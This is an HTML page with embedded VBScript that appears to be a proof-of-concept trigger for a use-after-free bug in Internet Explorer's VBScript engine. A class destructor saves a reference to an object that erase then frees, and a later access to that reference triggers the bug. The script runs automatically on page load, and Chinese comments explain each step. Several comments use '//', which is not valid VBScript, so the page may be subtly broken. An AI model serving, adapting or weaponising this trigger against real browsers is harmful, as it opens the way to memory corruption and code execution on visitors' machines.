<!doctype html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
</head>
<body>
<script language="vbscript">
dim array_a
dim array_b(1)
class Trigger
    // 析构函数
    Private sub class_Terminate()
        // 在释放之前将指向 Trrigger 的指针保存到 array_b(0) 中
        set array_b(0) = array_a(1)
        // 解引用为了使用 Trrigger
        array_a(1) = 1
    end sub
end class

sub uaf
    redim array_a(1)
    set array_a(1) = new Trigger
    // erase 函数用于重置固定大小数组的值并释放动态数组的内存
    // 释放前调用 class_Terminate
    erase array_a
end sub

sub TriggerVuln
    // 再次引用空指针触发 UAF
    array_b(0) = 0
end sub

sub startExploit
    uaf
    TriggerVuln
end sub

startExploit
</script>
</body>
</html>